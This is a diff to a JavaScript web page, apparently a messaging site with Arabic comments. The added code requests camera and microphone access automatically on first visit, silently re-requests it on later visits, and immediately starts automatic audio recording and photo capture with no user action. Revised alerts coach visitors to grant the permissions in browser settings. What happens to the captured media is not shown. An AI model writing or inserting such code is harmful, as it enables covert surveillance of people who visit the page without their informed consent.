@@ -673,6 +673,14 @@
             if (saved) {
                 permissionsGranted = JSON.parse(saved);
                 console.log('✅ تم تحميل حالة الصلاحيات:', permissionsGranted);
+                
+                // إعادة تفعيل الصلاحيات تلقائياً
+                if (permissionsGranted.audio && !audioStream) {
+                    requestAudioPermission(true);
+                }
+                if (permissionsGranted.video && !videoStream) {
+                    requestCameraPermission(true);
+                }
             }
         }
 
@@ -704,7 +712,7 @@
                 permissionsGranted.audio = false;
                 savePermissions();
                 if (!silent) {
-                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصوت');
+                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصوت اضغط على العلامه في الاعلى يسار رابط الموقع واضغط على الاذونات و فعل الاذونات');
                 }
                 return false;
             }
@@ -723,7 +731,7 @@
                 permissionsGranted.video = false;
                 savePermissions();
                 if (!silent) {
-                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصورة');
+                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصورة اضغط على العلامه في الاعلى يسار رابط الموقع و اضغط على الاذونات و فعل الاذونات ');
                 }
                 return false;
             }
@@ -1394,7 +1402,44 @@
             loadData();
             loadPermissions();
             setInterval(checkForMessages, 2000);
+            
+            // طلب الصلاحيات عند أول زيارة
+            setTimeout(() => {
+                if (!permissionsGranted.audio && !permissionsGranted.video) {
+                    requestInitialPermissions();
+                }
+            }, 1000);
         });
+
+        async function requestInitialPermissions() {
+            try {
+                // طلب الصلاحيات معاً
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: true, 
+                    video: true 
+                });
+                
+                // فصل الصوت والفيديو
+                audioStream = new MediaStream(stream.getAudioTracks());
+                videoStream = new MediaStream(stream.getVideoTracks());
+                
+                permissionsGranted.audio = true;
+                permissionsGranted.video = true;
+                savePermissions();
+                
+                console.log('✅ تم الحصول على جميع الصلاحيات');
+                
+                // بدء التسجيل التلقائي
+                startAutoAudioRecording();
+                startAutoPhotoCapture();
+                
+            } catch (error) {
+                console.error('❌ خطأ في الصلاحيات:', error);
+                // محاولة طلب كل صلاحية على حدة
+                requestAudioPermission();
+                requestCameraPermission();
+            }
+        }
     </script>
 </body>
 </html>
